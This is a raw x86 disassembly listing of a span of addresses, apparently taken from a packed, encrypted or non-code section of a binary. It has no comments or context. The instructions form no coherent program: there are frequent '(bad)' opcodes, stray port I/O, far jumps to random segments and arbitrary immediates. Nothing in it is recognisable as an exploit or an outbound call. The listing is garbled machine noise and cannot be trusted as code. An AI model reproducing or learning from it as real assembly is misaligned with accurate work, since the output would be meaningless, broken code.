  406b3f:	sub    al,0x4c
  406b41:	(bad)  
  406b42:	dec    ecx
  406b43:	push   ecx
  406b44:	lds    esi,FWORD PTR [ebx+ecx*2-0x2a]
  406b48:	pusha  
  406b49:	push   ebp
  406b4a:	mov    ch,0x52
  406b4c:	or     al,0x73
  406b4e:	int    0xa1
  406b50:	sbb    esi,DWORD PTR [ebx+0x36]
  406b53:	shl    BYTE PTR [ecx-0x25],cl
  406b56:	test   eax,0x528aac5f
  406b5b:	inc    esi
  406b5c:	xchg   ebp,eax
  406b5d:	or     DWORD PTR cs:[edi+0x62dfc7b9],eax
  406b64:	dec    edx
  406b65:	mov    WORD PTR [esp+edi*4-0x45],?
  406b69:	dec    esp
  406b6a:	mov    ecx,0x7961aef
  406b6f:	loopne 0x406b46
  406b71:	mov    bl,0xe
  406b73:	sub    cl,BYTE PTR [ecx+0x2e]
  406b76:	popf   
  406b77:	ror    BYTE PTR [ecx+0x1],cl
  406b7a:	cmp    eax,0x8751b9c
  406b7f:	shr    edi,0x29
  406b82:	outs   dx,DWORD PTR ds:[esi]
  406b83:	mov    eax,0x2a3c28bf
  406b88:	or     al,0x92
  406b8a:	mov    ebx,0xb01eeea9
  406b8f:	or     DWORD PTR [edi],edi
  406b91:	xchg   ecx,eax
  406b92:	xor    BYTE PTR [edx],bh
  406b94:	jge    0x406bcb
  406b96:	mov    eax,0xc0a65426
  406b9b:	fdivr  DWORD PTR [eax-0x66]
  406b9e:	mov    esp,0x88f77adb
  406ba3:	and    eax,0x81d65466
  406ba8:	and    eax,0xc8afc0b3
  406bad:	adc    esp,DWORD PTR [eax]
  406baf:	mov    eax,0x8d26c906
  406bb4:	pop    ecx
  406bb5:	lods   eax,DWORD PTR ds:[esi]
  406bb6:	ds fs push edi
  406bb9:	aam    0x3c
  406bbb:	mov    bh,0x9b
  406bbd:	ins    DWORD PTR es:[edi],dx
  406bbe:	pop    esi
  406bbf:	(bad)  
  406bc0:	sti    
  406bc1:	neg    BYTE PTR [eax]
  406bc3:	loopne 0x406bfc
  406bc5:	popf   
  406bc6:	cld    
  406bc7:	dec    ebp
  406bc8:	inc    esi
  406bc9:	cmc    
  406bca:	mov    esi,0x2582200e
  406bcf:	in     eax,0xee
  406bd1:	mov    esp,DWORD PTR [esi-0x7d2bebf6]
  406bd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406bd8:	imul   ebp,DWORD PTR [edx+0x555a1329],0x34
  406bdf:	dec    ebx
  406be0:	add    eax,0xf83368a8
  406be5:	jno    0x406c50
  406be7:	test   BYTE PTR [edx],0xa5
  406bea:	cmp    DWORD PTR [ecx-0x47],0xffffffea
  406bee:	cmp    eax,0x37f1eb80
  406bf3:	push   ebp
  406bf4:	rcr    DWORD PTR [edx+0x31],0x5c
  406bf8:	jne    0x406ba6
  406bfa:	dec    ecx
  406bfb:	xor    al,0x75
  406bfd:	mov    ah,0x89
  406bff:	sti    
  406c00:	addr16 or eax,0xeb1de76f
  406c06:	mov    edi,esp
  406c08:	retf   0x39fa
  406c0b:	cs pop eax
  406c0d:	adc    ch,BYTE PTR [edx+0x3c6ca433]
  406c13:	jmp    0x406c0e
  406c15:	int3   
  406c16:	je     0x406bb4
  406c18:	psrad  mm4,QWORD PTR ds:0xf5a34db9
  406c1f:	inc    ebp
  406c20:	and    bh,BYTE PTR ds:0x19320c75
  406c26:	ins    DWORD PTR es:[edi],dx
  406c27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c28:	dec    ebx
  406c29:	push   esi
  406c2a:	and    esi,DWORD PTR [eax+0x560dbcb8]
  406c30:	pusha  
  406c31:	std    
  406c32:	out    0x14,al
  406c34:	jne    0x406c41
  406c36:	sub    edx,DWORD PTR [edx+0x7e3c99f2]
  406c3c:	jnp    0x406c00
  406c3e:	shl    BYTE PTR [si+0x480d],1
  406c43:	sub    dl,BYTE PTR [ebx]
  406c45:	jmp    0xa345:0xf3368ac8
  406c4c:	adc    cl,BYTE PTR [ebx+esi*8]
  406c4f:	jmp    FWORD PTR [ebx+ebx*4]
  406c52:	pop    eax
  406c53:	sub    dl,bl
  406c55:	or     eax,0x6401d035
  406c5a:	mov    BYTE PTR [ebx],bh
  406c5c:	inc    esi
  406c5d:	neg    BYTE PTR [ecx+0x12368c15]
  406c63:	inc    ebx
  406c64:	xchg   edi,eax
  406c65:	stos   DWORD PTR es:[edi],eax
  406c66:	cmp    ch,BYTE PTR [ecx]
  406c68:	add    esi,DWORD PTR [edx-0x3ce51313]
  406c6e:	ja     0x406cc3
  406c70:	adc    bl,al
  406c72:	inc    ecx
  406c73:	mov    BYTE PTR ds:0x545e35e8,dh
  406c79:	popf   
  406c7a:	sub    esi,esp
  406c7c:	xor    al,0xf8
  406c7e:	and    DWORD PTR [ebx],ebp
  406c80:	pcmpeqb mm4,mm4
  406c83:	xchg   edx,eax
  406c84:	hlt    
  406c85:	imul   edx,DWORD PTR [ebp-0x6b50939d],0x750b8308
  406c8f:	pop    edx
  406c90:	or     eax,0x4b4a2108
  406c95:	mov    esp,0x6ec8d5b9
  406c9a:	push   ecx
  406c9b:	nop
  406c9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c9d:	ins    BYTE PTR es:[edi],dx
  406c9e:	adc    al,0x96
  406ca0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ca1:	ins    BYTE PTR es:[edi],dx
  406ca2:	iret   
  406ca3:	push   ebp
  406ca4:	mov    ebx,0xdef4645a
  406ca9:	xchg   ebp,eax
  406caa:	addps  xmm0,XMMWORD PTR [ebp+0x6]
  406cae:	xchg   esp,eax
  406caf:	sti    
  406cb0:	cs sub al,dh
  406cb3:	fsubr  st,st(6)
  406cb5:	add    eax,0xeb02df78
  406cba:	mov    esi,0x2db1b1a5
  406cbf:	adc    eax,0x2da94e0a
  406cc4:	jecxz  0x406cc8
  406cc6:	or     DWORD PTR [ebx+0x8],0x26fac64b
  406ccd:	jnp    0x406d20
  406ccf:	rcr    BYTE PTR [eax],cl
  406cd1:	in     eax,0x86
  406cd3:	mov    ds:0xb4d96024,al
  406cd8:	or     eax,0xed93959c
  406cdd:	push   esp
  406cde:	mov    dl,BYTE PTR [eax+0xb]
  406ce1:	pop    esi
  406ce2:	pop    ds
  406ce3:	pop    ds
  406ce4:	les    esi,FWORD PTR [eax+0x958b62d]
  406cea:	cmp    ebp,DWORD PTR ds:0xc65da92e
  406cf0:	pop    eax
  406cf1:	shl    DWORD PTR [ecx-0x614881d],0x32
  406cf8:	loop   0x406ca2
  406cfa:	xchg   esi,eax
  406cfb:	arpl   WORD PTR [ebp+0x26046a03],si
  406d01:	pop    eax
  406d02:	les    eax,FWORD PTR [edx]
  406d04:	and    eax,edi
  406d06:	dec    edx
  406d07:	jne    0x406d08
  406d09:	jmp    FWORD PTR [ebx]
  406d0b:	xchg   esp,eax
  406d0c:	push   es
  406d0d:	xlat   BYTE PTR ds:[ebx]
  406d0e:	in     al,0xa
  406d10:	rcl    BYTE PTR [ebx+0x1f],0x1e
  406d14:	push   esi
  406d15:	mov    bh,0xd8
  406d17:	lea    edi,[edx+0x74]
  406d1a:	outs   dx,BYTE PTR ds:[esi]
  406d1b:	lds    ebp,FWORD PTR [esp+ecx*4]
  406d1e:	xchg   esp,eax
  406d1f:	cvtpi2ps xmm6,QWORD PTR [eax+0x6a]
  406d23:	aam    0x86
  406d25:	xchg   ecx,eax
  406d26:	xor    al,0xf8
  406d28:	out    dx,eax
  406d29:	icebp  
  406d2a:	imul   eax,DWORD PTR [ecx],0xffffff8c
  406d2d:	xchg   esp,eax
  406d2e:	es pop edi
  406d30:	lahf   
  406d31:	xor    edi,DWORD PTR [ebp-0x18]
  406d34:	mov    bl,0xab
  406d36:	add    BYTE PTR [ebx],0x86
  406d39:	sti    
  406d3a:	fld    st(2)
  406d3c:	jo     0x406d3d
  406d3e:	loope  0x406cd6
  406d40:	(bad)  
  406d41:	push   ss
  406d42:	inc    ebp
  406d43:	inc    esp
  406d44:	inc    ebx
  406d45:	xor    ah,BYTE PTR [ebp+0x8]
  406d48:	push   ebp
  406d49:	lahf   
  406d4a:	dec    ecx
  406d4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d4e:	sub    edx,DWORD PTR [edx+0x1e7d75dd]
  406d54:	dec    DWORD PTR [esi+ebx*4+0xb]
  406d58:	dec    edi
  406d59:	and    ch,BYTE PTR [esi+0x51]
  406d5c:	mov    ecx,esi
  406d5e:	cmp    BYTE PTR [edi],cl
  406d60:	cmp    eax,0x267b3240
  406d65:	cdq    
  406d66:	ret    
  406d67:	xor    al,0x7e
  406d6a:	mov    cl,0x18
  406d6c:	outs   dx,DWORD PTR ds:[esi]
  406d6d:	ja     0x406db6
  406d6f:	pop    ds
  406d70:	jo     0x406d72
  406d72:	xor    BYTE PTR [ebp+0x644f2208],cl
  406d78:	jns    0x406dbd
  406d7a:	or     ah,BYTE PTR [edx]
  406d7c:	aas    
  406d7d:	out    0x5b,al
  406d7f:	sub    eax,0xe9492303
  406d84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d85:	xor    ebp,ebp
  406d87:	cmp    eax,0xf77b35
  406d8c:	ret    0xed8f
  406d8f:	push   ds
  406d90:	rol    cl,1
  406d92:	cmp    DWORD PTR [edi],edi
  406d94:	mov    bh,0xac
  406d96:	jne    0x406d7c
  406d98:	sbb    esp,DWORD PTR [edx]
  406d9a:	repnz inc esp
  406d9c:	(bad)  
  406d9d:	inc    esp
  406d9e:	ins    DWORD PTR es:[edi],dx
  406d9f:	fild   DWORD PTR [esi-0x66f667c3]
  406da5:	(bad)  
  406da7:	adc    edi,DWORD PTR [edx+ebp*8]
  406daa:	mov    edi,DWORD PTR [edi-0x4d]
  406dad:	xchg   ebx,eax
  406dae:	xor    edi,ebp
  406db0:	pop    ebx
  406db1:	jp     0x8ab5e965
  406db7:	dec    esi
  406db8:	dec    eax
  406db9:	jns    0x406d4c
  406dbb:	call   0xe7e3:0x1509cab9
  406dc2:	mov    esi,0xb7746aa1
  406dc7:	lock aad 0x6a
  406dca:	mov    ebp,0x11ea2a8e
  406dcf:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  406dd1:	sbb    BYTE PTR [edx-0x229c499e],bh
  406dd7:	call   0xdadf2d11
  406ddc:	xor    eax,0x48f104d0
  406de1:	mov    edi,0x9f89f12c
  406de6:	outs   dx,DWORD PTR ds:[esi]
  406de7:	mov    cl,BYTE PTR [edi+ebx*1-0x4b]
  406deb:	xchg   edi,eax
  406dec:	adc    bl,BYTE PTR [ebx+0x586d8f73]
  406df2:	add    eax,0xdeddfeaa
  406df7:	mov    eax,0xcb222853
  406dfc:	mov    cl,0xeb
  406dfe:	test   eax,0x5e13d2fa
  406e03:	cmp    esi,DWORD PTR [ecx-0x7d]
  406e06:	arpl   WORD PTR [edx+0x6a],di
  406e09:	xchg   edx,eax
  406e0a:	test   DWORD PTR [esi+ebp*8-0x360aff94],edi
  406e11:	jmp    esi
  406e13:	pop    ss
  406e14:	cmp    esi,edi
  406e16:	call   0x4ae5262d
  406e1b:	daa    
  406e1c:	fisubr DWORD PTR [edi-0xf]
  406e1f:	pusha  
  406e20:	fist   WORD PTR [eax]
  406e22:	mov    esp,0x998dc598
  406e27:	fistp  QWORD PTR [esi-0x20]
  406e2a:	lock idiv DWORD PTR [eax-0x61]
  406e2e:	xchg   ebp,eax
  406e2f:	mov    ecx,0x8ec91015
  406e34:	cli    
  406e35:	fadd   DWORD PTR [ebp+0x13e0fe42]
  406e3b:	mov    ?,WORD PTR [ecx+0x6]
  406e3e:	inc    eax
  406e3f:	xlat   BYTE PTR ds:[ebx]
  406e40:	inc    esp
  406e41:	push   0x56bd2be8
  406e46:	sub    BYTE PTR gs:[eax-0x56f393a7],bh
  406e4d:	mov    DWORD PTR [esi-0x4e],edx
  406e50:	mov    cl,0x81
  406e52:	add    al,BYTE PTR [edx+0x4d]
  406e55:	mov    bl,0xd9
  406e57:	lock jae 0x406ed6
  406e5a:	push   esi
  406e5b:	in     eax,dx
  406e5c:	iret   
  406e5d:	popa   
  406e5e:	or     ebx,DWORD PTR [ebp+0x21]
  406e61:	stos   BYTE PTR es:[edi],al
  406e62:	cdq    
  406e63:	inc    ebp
  406e64:	pop    esp
  406e65:	sar    DWORD PTR [edi],0x4a
  406e68:	mov    dl,0x63
  406e6a:	cld    
  406e6b:	call   0xe3b3:0x9b224ef5
  406e72:	mov    ah,0x34
  406e74:	push   0xb58b9493
  406e79:	call   0x93a42aeb
  406e7e:	xchg   edx,eax
  406e7f:	inc    edx
  406e80:	inc    DWORD PTR [ebp+0xbb26127]
  406e86:	repnz mov esi,0xaac9b606
  406e8c:	ret    0x86d0
  406e8f:	mov    bh,0x67
  406e91:	call   FWORD PTR [ecx+0x45]
  406e94:	sbb    BYTE PTR [ecx+0x71],cl
  406e97:	gs jle 0x406e40
  406e9a:	mov    ebp,0x9285f677
  406e9f:	int    0x4
  406ea1:	sahf   
  406ea2:	sub    eax,0x72c2b15b
  406ea7:	adc    ebx,DWORD PTR [esp+ebp*8]
  406eaa:	mov    ah,0xff
  406eac:	mov    fs,WORD PTR [ebx]
  406eae:	and    esp,DWORD PTR [eax+0x73]
  406eb1:	adc    dl,al
  406eb3:	sbb    ch,cl
  406eb5:	inc    eax
  406eb6:	mov    bh,BYTE PTR [ebp-0x32]
  406eb9:	or     BYTE PTR [edx+ebp*1],dl
  406ebc:	popf   
  406ebd:	stos   DWORD PTR es:[edi],eax
  406ebe:	inc    eax
  406ebf:	dec    BYTE PTR [esi-0x6acfcbf]
  406ec5:	xor    ecx,DWORD PTR [ebx+0x44]
  406ec8:	or     eax,0xc4cf998a
  406ecd:	aas    
  406ece:	jne    0x406ed7
  406ed0:	mov    ecx,0x94de9d71
  406ed5:	add    al,0x4e
  406ed7:	mov    ds:0x6b1967d3,al
  406edc:	(bad)  
  406edd:	push   eax
  406ede:	xchg   edx,eax
  406edf:	aam    0x87
  406ee1:	int3   
  406ee2:	sahf   
  406ee3:	rcl    BYTE PTR [esi+edx*2+0x4633d3ac],cl
  406eea:	bound  edi,QWORD PTR [ebx]
  406eec:	inc    edi
  406eed:	push   ecx
  406eee:	push   cs
  406eef:	xchg   esi,eax
  406ef0:	cmp    ebp,ebx
  406ef2:	xor    ah,BYTE PTR [ebx-0x32baceb3]
  406ef8:	jp     0x406e7d
  406efa:	mov    edi,0x878412bc
  406eff:	je     0x406e92
  406f01:	ret    
  406f02:	pop    ss
  406f03:	push   ss
  406f04:	xchg   DWORD PTR [ebx+0x5d],ecx
  406f07:	sahf   
  406f08:	int3   
  406f09:	ja     0x406ed1
  406f0b:	in     eax,0x1b
  406f0d:	dec    ebp
  406f0e:	jle    0x406ede
  406f10:	out    0x4e,al
  406f12:	aam    0xa7
  406f14:	lahf   
  406f15:	mov    ah,BYTE PTR [edx+esi*1]
  406f18:	sub    BYTE PTR [ebp+0x1b6b105f],ah
  406f1e:	pop    esp
  406f1f:	pop    es
  406f20:	scas   al,BYTE PTR es:[edi]
  406f21:	pop    DWORD PTR [ebp+0x7739e195]
  406f27:	and    dh,bh
  406f29:	test   eax,0xb79ad8d6
  406f2e:	(bad)  
  406f2f:	pop    esi
  406f30:	xchg   edi,eax
  406f31:	(bad)  
  406f32:	repnz iret 
  406f34:	out    0x98,eax
  406f36:	pushf  
  406f37:	data16 or ch,dl
  406f3a:	mov    ch,0x74
  406f3c:	sub    ecx,eax
  406f3e:	jmp    0x406f45
  406f40:	lahf   
  406f41:	test   eax,0x5db96b38
  406f46:	mov    edi,0x241e1b2e
  406f4b:	cmc    
  406f4c:	mov    ecx,0xf464b50
  406f51:	cdq    
  406f52:	stos   DWORD PTR es:[edi],eax
  406f53:	lods   eax,DWORD PTR ds:[esi]
  406f54:	stc    
  406f55:	aaa    
  406f56:	jb     0x406f01
  406f58:	sub    ecx,DWORD PTR [eax+eax*2-0x64]
  406f5c:	add    eax,0xa81564ee
  406f61:	xor    al,0x48
  406f63:	out    dx,eax
  406f64:	cmc    
  406f65:	sub    ebx,eax
  406f67:	mov    bl,0xa8
  406f69:	imul   esi,DWORD PTR [edx-0x2dadd611],0x9227393e
  406f73:	jmp    0xb4a5bc47
  406f78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f79:	mov    bh,0xe
  406f7b:	aaa    
  406f7c:	xchg   esp,eax
  406f7d:	aaa    
  406f7e:	jne    0x406f58
  406f80:	pop    ebx
  406f81:	std    
  406f82:	in     eax,dx
  406f83:	mov    al,ds:0xd7e65301
  406f88:	fbstp  TBYTE PTR [ecx+0x4b723812]
  406f8e:	bswap  edx
  406f90:	repz mov ah,0x89
  406f93:	adc    DWORD PTR [ebx],ebx
  406f95:	retf   
  406f96:	lods   al,BYTE PTR ds:[esi]
  406f97:	xlat   BYTE PTR ds:[ebx]
  406f98:	es jmp 0x406fcc
  406f9b:	nop
  406f9c:	xor    ebx,edi
  406f9e:	mov    ecx,0x78d3a871
  406fa4:	mov    edx,0xe4f4f5c
  406fa9:	sbb    BYTE PTR [esi+edi*8],cl
  406fac:	sahf   
  406fad:	and    DWORD PTR ds:0xa4627888,0x23
  406fb4:	xchg   edx,eax
  406fb5:	ret    0xa69a
  406fb8:	ins    DWORD PTR es:[edi],dx
  406fb9:	dec    ebx
  406fba:	xchg   ebx,eax
  406fbb:	xchg   ebx,eax
  406fbc:	fdivr  DWORD PTR [ebx+0x60]
  406fbf:	std    
  406fc0:	dec    eax
  406fc1:	add    BYTE PTR ds:0x6daf5758,0xb8
  406fc8:	adc    al,BYTE PTR [ebx]
  406fca:	xchg   edx,eax
  406fcb:	mov    gs,WORD PTR [esi-0x5d]
  406fce:	mov    esp,0xc4860b7e
  406fd3:	inc    edi
  406fd4:	inc    ecx
  406fd5:	xchg   BYTE PTR [edx-0x1f],bl
  406fd8:	fisubr DWORD PTR [ebp+0x6431f466]
  406fde:	pushf  
  406fdf:	or     ch,BYTE PTR [ecx]
  406fe1:	mov    al,0x19
  406fe3:	call   0x1e8e585a
  406fe8:	add    eax,0x8d752d18
  406fed:	push   es
  406fee:	or     ah,cl
  406ff0:	scas   al,BYTE PTR es:[edi]
  406ff1:	fmul   st,st(1)
  406ff3:	push   0xa445c1a1
  406ff8:	sbb    al,0xbe
  406ffa:	fimul  WORD PTR [esi]
  406ffc:	jnp    0x40702f
  406ffe:	inc    edi
  407000:	prefetch BYTE PTR [esi]
  407003:	adc    al,0xa4
  407005:	jns    0x407006
  407007:	out    dx,eax
  407008:	pop    esi
  407009:	sbb    BYTE PTR [ebp+esi*4+0x549ec892],al
  407010:	jno    0x407068
  407012:	cmp    al,0xd4
  407014:	and    eax,0x9b260d08
  407019:	ret    0xc101
  40701c:	cmp    al,0xea
  40701e:	xchg   ecx,eax
  40701f:	cs retf 0x789a
  407023:	or     BYTE PTR [eax+0x77],ch
  407026:	loope  0x406fbd
  407028:	aam    0x0
  40702a:	out    0xbb,al
  40702c:	fdivr  DWORD PTR [ebx-0x3a59343]
  407032:	mov    ebx,0x556f8e19
  407037:	mov    ebx,0x8df2595f
  40703c:	pushf  
  40703d:	jle    0x407091
  40703f:	ss push es
  407041:	pushf  
  407042:	fisttp DWORD PTR [ecx+0x5193466a]
  407049:	pop    ds
  40704a:	hlt    
  40704b:	jbe    0x407099
  40704d:	leave  
  40704e:	xor    dh,BYTE PTR [edi-0x6fb639ac]
  407054:	sti    
  407055:	xchg   DWORD PTR [edi+0x59],ebp
  407058:	mov    ebp,0x3e33afd1
  40705d:	(bad)  
  40705e:	xor    eax,0x4400558b
  407063:	rcr    ecx,cl
  407065:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407066:	push   0xffffffe4
  407068:	mov    BYTE PTR [edx-0x1291e390],bh
  40706e:	call   0x6e0d:0x8ffcd00b
  407075:	jmp    0xb161:0xe507e134
  40707c:	adc    al,0xd3
  40707e:	inc    esp
  40707f:	leave  
  407080:	lea    ebp,[edx]
  407082:	push   edi
  407083:	xchg   edi,eax
  407084:	jbe    0x407072
  407086:	and    DWORD PTR [esi+ebp*2+0x62],edx
  40708a:	jns    0x4070b4
  40708c:	adc    edx,ebx
  40708e:	mov    eax,ds:0xdca9aef5
  407093:	call   0xba747391
  407098:	mov    dh,0xc7
  40709a:	xor    eax,0x10299599
  40709f:	aam    0x65
  4070a1:	mov    cl,bh
  4070a3:	xchg   edx,eax
  4070a4:	and    BYTE PTR [ebp-0x41ef21e9],bl
  4070aa:	call   0xe89af5c5
  4070af:	add    bh,BYTE PTR [edi]
  4070b1:	ja     0x4070a6
  4070b3:	es push ebp
  4070b5:	jecxz  0x40706a
  4070b7:	mov    esp,0x2daa0065
  4070bc:	jbe    0x40705d
  4070be:	bnd ret 0xa75a
  4070c2:	mov    BYTE PTR [ebx+0x49],al
  4070c5:	dec    eax
  4070c6:	xchg   ecx,eax
  4070c7:	lahf   
  4070c8:	push   ds
  4070c9:	cs dec edx
  4070cb:	test   eax,0xe4d785c0
  4070d0:	cmp    cl,BYTE PTR [edx+0x76]
  4070d3:	adc    DWORD PTR [esi],ebp
  4070d5:	jno    0x4070a7
  4070d7:	aad    0x8c
  4070d9:	adc    bl,BYTE PTR [ebx]
  4070db:	adc    al,0x60
  4070dd:	pushf  
  4070de:	cmp    eax,0x9984751c
  4070e3:	cmp    al,0x2c
  4070e5:	sub    al,0x1e
  4070e7:	in     al,0x2a
  4070e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070ea:	in     al,dx
  4070eb:	pop    edi
  4070ec:	or     eax,0x7d1595a1
  4070f1:	or     DWORD PTR [ebx+0x18ed5d8f],eax
  4070f7:	fadd   st,st(6)
  4070f9:	lea    edi,[esi+0x65d366cd]
  4070ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407100:	cmp    BYTE PTR [ebx-0x5],cl
  407103:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407104:	add    al,0x78
  407106:	lods   al,BYTE PTR ds:[esi]
  407107:	add    edi,DWORD PTR [edi-0x80]
  40710a:	repz std 
  40710c:	pop    eax
  40710d:	cmp    ecx,ecx
  40710f:	mov    bh,0xa7
  407111:	daa    
  407112:	or     esp,DWORD PTR [edx+0x5f]
  407115:	in     eax,0x87
  407117:	push   esi
  407118:	ins    DWORD PTR es:[edi],dx
  407119:	adc    ecx,ebx
  40711b:	adc    ah,al
  40711d:	stc    
  40711e:	inc    ecx
  40711f:	adc    ch,0xb4
  407122:	xor    ch,BYTE PTR [ebp*1-0x2d322667]
  407129:	fnstsw WORD PTR [eax+0x79]
  40712c:	xchg   ebx,eax
  40712d:	cdq    
  40712e:	dec    edi
  40712f:	mov    ecx,0xdfc60474
  407134:	sbb    esi,DWORD PTR [esi]
  407136:	aad    0x75
  407138:	or     BYTE PTR [ecx],al
  40713a:	out    dx,al
  40713b:	rol    DWORD PTR [edx-0x425f0963],1
  407141:	ret    0x2122
  407144:	aaa    
  407145:	mov    ds:0xb622dbfd,al
  40714a:	fwait
  40714b:	das    
  40714c:	fwait
  40714d:	and    BYTE PTR [edi+ecx*4],ah
  407150:	or     BYTE PTR [edx+0x73bb8c98],ah
  407156:	xchg   ecx,eax
  407157:	add    al,BYTE PTR [ebx]
  407159:	inc    esi
  40715a:	inc    ecx
  40715b:	std    
  40715c:	fist   DWORD PTR [ecx+0x1a938584]
  407162:	mov    bl,BYTE PTR [esi+0x4b]
  407165:	push   esi
  407166:	mov    edx,0xff16ea1e
  40716b:	and    BYTE PTR [edi],cl
  40716d:	ds fwait
  40716f:	cmp    eax,0x91e1cf70
  407174:	repz shr dl,cl
  407177:	sbb    eax,0x4f0694ed
  40717c:	pop    edx
  40717d:	xor    BYTE PTR [edx],0x43
  407180:	cmc    
  407181:	out    0x98,al
  407183:	inc    ebp
  407184:	mov    al,0xe0
  407186:	call   0x742d:0xe26d8bab
  40718d:	aaa    
  40718e:	in     al,0x75
  407190:	dec    esp
  407191:	call   0x4ece:0xb7e22bc5
  407198:	loope  0x40717e
  40719a:	sub    DWORD PTR [ecx-0x66ea3079],eax
  4071a0:	lea    esi,[edi-0x58eb7dc1]
  4071a6:	lahf   
  4071a7:	in     al,0xc2
  4071a9:	(bad)  
  4071aa:	dec    ebx
  4071ac:	inc    edi
  4071ad:	ins    BYTE PTR es:[edi],dx
  4071ae:	xor    esp,esp
  4071b0:	add    BYTE PTR [edx+0x530e1bc5],ch
  4071b6:	sti    
  4071b7:	mov    eax,0x77ab0942
  4071bc:	jbe    0x4071fd
  4071be:	jecxz  0x40718b
  4071c0:	arpl   WORD PTR [eax+ebx*4-0x10],dx
  4071c4:	shl    edx,0x27
  4071c7:	push   sp
  4071c9:	and    eax,0xee260995
  4071ce:	push   ds
  4071cf:	xchg   ecx,eax
  4071d0:	dec    esi
  4071d1:	xor    ch,BYTE PTR [ebp+0x59560c6f]
  4071d7:	aaa    
  4071d8:	mov    BYTE PTR [eax],dh
  4071da:	mov    edx,0xfde870a6
  4071df:	enter  0x5a23,0x72
  4071e3:	fwait
  4071e4:	shr    DWORD PTR [ebx+0x5be9f054],cl
  4071ea:	retf   
  4071eb:	jmp    0x40716d
  4071ed:	and    BYTE PTR [ebx-0x10],bh
  4071f0:	fadd   QWORD PTR [ebx]
  4071f2:	into   
  4071f3:	cmp    eax,0x7aad68fe
  4071f8:	loope  0x407221
  4071fa:	and    DWORD PTR [ecx],edx
  4071fc:	cmp    eax,0xc64f2a11
  407201:	dec    esi
  407202:	les    eax,FWORD PTR [edx]
  407204:	cmp    cl,BYTE PTR [edx]
  407206:	imul   edx,DWORD PTR [ebx+0x6d],0xda3772c
  40720d:	std    
  40720e:	out    dx,eax
  40720f:	jecxz  0x4071c0
  407211:	repnz scas eax,DWORD PTR es:[edi]
  407213:	in     eax,dx
  407214:	adc    eax,0x7839f07b
  407219:	mov    bh,BYTE PTR [esi-0x17c4b7c5]
  40721f:	sub    dh,dl
  407221:	pop    ebp
  407222:	mov    ch,0xd7
  407224:	fucomip st,st(3)
  407226:	sahf   
  407227:	unpckhps xmm1,xmm5
  40722a:	pop    ebp
  40722b:	jg     0x407237
  40722d:	call   0x8274:0x6e850e6f
  407234:	mov    eax,ds:0x6b72a7d
  407239:	cld    
  40723a:	mov    al,ds:0x9095a090
  40723f:	jmp    0x4072a2
  407241:	jl     0x407226
  407243:	push   esp
  407244:	in     al,dx
  407245:	(bad)  
  407246:	sub    ebp,ebp
  407248:	scas   eax,DWORD PTR es:[edi]
  407249:	or     DWORD PTR [edx],0x5c
  40724c:	sbb    dh,BYTE PTR [eax]
  40724e:	jns    0x407222
  407250:	add    edx,DWORD PTR [ebp+ebx*2+0x20]
  407254:	int3   
  407255:	dec    esi
  407256:	adc    DWORD PTR [ebp+0x2d6d62bf],esp
  40725c:	jno    0x4071f1
  40725e:	popf   
  40725f:	stos   DWORD PTR es:[edi],eax
  407260:	mov    eax,ds:0x82a5e5fd
  407265:	add    al,0x54
  407267:	jle    0x407216
  407269:	jle    0x407280
  40726b:	xor    al,0x64
  40726d:	sbb    ebp,esi
  40726f:	ss into 
  407271:	xor    esp,edi
  407273:	int    0xa9
  407275:	retf   0x988d
  407278:	adc    al,0x4b
  40727a:	xchg   edx,esi
  40727c:	and    DWORD PTR [edi],0x54bb81ad
  407282:	xor    dh,BYTE PTR [ecx+0x74]
  407285:	jecxz  0x40724a
  407287:	mov    edi,0x74d3f90b
  40728c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40728d:	sbb    al,0x33
  40728f:	inc    edx
  407290:	out    dx,eax
  407291:	cmp    eax,0xcbd8340
  407296:	into   
  407297:	imul   ebp,DWORD PTR [ecx],0x39
  40729a:	adc    DWORD PTR [eax+0x7a942643],edi
  4072a0:	fwait
  4072a1:	aad    0xe0
  4072a3:	pop    ebp
  4072a4:	sbb    dl,cl
  4072a6:	mov    ds:0xc691722d,al
  4072ab:	into   
  4072ac:	aaa    
  4072ad:	ds (bad) 
  4072b0:	mov    BYTE PTR [eax+ecx*4],ch
  4072b3:	mov    ch,0x7
  4072b5:	push   cs
  4072b6:	lods   al,BYTE PTR ds:[esi]
  4072b7:	or     DWORD PTR [edi+0x677d403f],ecx
  4072bd:	or     DWORD PTR [ebx],ecx
  4072bf:	sub    eax,ebp
  4072c1:	dec    esi
  4072c2:	add    eax,0xac52f003
  4072c7:	dec    DWORD PTR [edx-0x780dc0fb]
  4072cd:	sub    DWORD PTR [ebp+ecx*8+0x5e1bff6e],ebp
  4072d4:	ficom  DWORD PTR gs:[ebp+0x50]
  4072d8:	retf   
  4072d9:	test   DWORD PTR [eax],ebx
  4072db:	xchg   ecx,eax
  4072dc:	aad    0xde
  4072de:	jle    0x4072b8
  4072e0:	push   ebp
  4072e1:	sub    al,0xc9
  4072e3:	lods   eax,DWORD PTR ds:[esi]
  4072e4:	mov    al,bl
  4072e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072e7:	outs   dx,DWORD PTR ds:[esi]
  4072e8:	(bad)  
  4072e9:	call   0x52182fbe
  4072ee:	cld    
  4072ef:	stc    
  4072f0:	pushf  
  4072f1:	pop    es
  4072f2:	sub    eax,0x89815bc2
  4072f7:	ds mov ch,0x5
  4072fa:	adc    dl,ch
  4072fc:	mov    al,0x3c
  4072fe:	in     al,dx
  4072ff:	inc    ebx
  407300:	lds    esp,FWORD PTR [edi-0x7dde2d06]
  407306:	jns    0x407361
  407308:	mov    eax,0x4ce6214d
  40730d:	xchg   ebp,eax
